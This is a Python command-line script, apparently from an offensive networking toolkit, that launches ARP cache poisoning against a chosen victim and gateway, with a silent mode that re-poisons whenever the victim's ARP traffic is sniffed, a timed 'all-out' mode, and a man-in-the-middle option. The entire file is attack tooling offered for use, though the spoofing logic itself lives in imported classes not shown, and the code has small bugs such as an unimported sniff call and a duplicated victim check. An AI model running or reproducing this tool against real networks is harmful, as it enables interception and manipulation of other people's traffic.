from ARP import ARP
from classes.User import User
import time
import argparse
import socket

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest = "target_ip", help = "IP Address of the target.")
    parser.add_argument("-g", "--gateway", dest = "gateway_ip", help = "IP Address of the Gateway.")
    parser.add_argument("-ip", "--localip", dest = "local_ip", help = "IP Address of the Attacker.")
    parser.add_argument("-i", "--interface", dest = "interface", help = "The interface to use for the attacks.")
    parser.add_argument("-s", "--silent", dest = "silent", help = "Choose between silent or 'all-out' mode. Answer with 'y' or 'n', default 'y'")
    parser.add_argument("-w", "--wait", dest = "wait_time", help = "Wait time in sec if non silent.")
    parser.add_argument("-m", "--mitm", dest = "mitm", help = "Poison only the victim's cache or perform a Man-in-the-Middle (y|n)")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] MISSING PARAMETER '-t' (target IP), use --help for more info.")
    elif not options.gateway_ip:
        parser.error("[-] MISSING PARAMETER '-g' (gateway IP), use --help for more info.")
    if not options.interface:
        options.interface = "enp0s3"
        print("Interface not defined, using default value of 'enp0s3'")
    if not options.local_ip:
        options.local_ip = 0
        print("Attacker IP not defined, will calculate IP later")
    if not options.silent:
        options.silent = True
        if options.wait_time:
            print("Wait time set, but in silent mode. Wait time ignored")
    else:
        if 'y' in options.silent:
            options.silent = True
        else:
            options.silent = False
            if not options.wait_time:
                print("Not in silent mode, but no wait time set. Using default 300")
                options.wait_time = 300
            else:
                options.wait_time = int(options.wait_time)
    if not options.mitm:
        options.mitm = False
    else:
        if 'y' in options.mitm:
            options.mitm = True
        else:
            options.mitm = False
    return options

def ARPSpoof(victim_ip, gateway_ip, interface, attacker_ip, silent = True, mitm = False, wait_time = 300,n_times = 0):
    if attacker_ip == 0:
        hostname = socket.gethostname()
        attacker_ip = socket.gethostbyname(hostname)
        print("Found local IP, using " + str(attacker_ip))
    attacker = User(attacker_ip)
    attacker.get_mac()
    victim = User(victim_ip)
    victim.get_mac()
    gateway = User(gateway_ip)
    gateway.get_mac()
    arp = ARP(attacker, victim, gateway, interface)
    if n_times <= 0:
        while True:
            if silent:
                pkt = sniff(count=1, filter="arp")
                if(pkt[0]["ARP"].pdst == victim.IP or pkt[0]["ARP"].pdst == victim.IP) :
                    arp.spoof(mitm)
            else:
                time.sleep(wait_time)
                arp.spoof(mitm)
    else:
        arp.spoof()


if __name__ == '__main__':
    options = get_args()
    target_ip = options.target_ip
    gateway_ip = options.gateway_ip
    interface = options.interface
    attacker_ip = options.local_ip
    silent = options.silent
    mitm = options.mitm
    wait_time = options.wait_time

    ARPSpoof(target_ip,
        gateway_ip,
        interface,
        attacker_ip,
        silent,
        mitm,
        wait_time
    )